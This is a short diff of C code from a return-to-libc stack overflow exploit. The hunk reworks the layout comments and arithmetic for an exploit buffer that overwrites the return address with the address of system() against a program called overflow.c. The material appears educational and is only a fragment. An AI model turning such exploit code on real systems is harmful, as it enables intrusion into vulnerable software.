@@ -40,9 +40,10 @@ int main(int argc, char ** argv)
     size_t * system_fn = (size_t *)0xDEADC0DE;
     char cmd_get_system_fn[BUFSIZ];
     char path_to_overflow[BUFSIZ];
-    char exploit_buffer[BUFLEN + 4 /* saved ebp (stack frame of the calling fn) */
+    char exploit_buffer[BUFLEN + 4 /* first argument of function overflow() in overflow.c */
                                + 4 /* return address -> address of system() */
-                               + 4 + 4 /* first argument for system() */];
+                               + 4 /* saved ebp (stack frame of the calling fn) */
+                               + 4 /* first argument for system() */];
 
     if (argc != 1)
     {
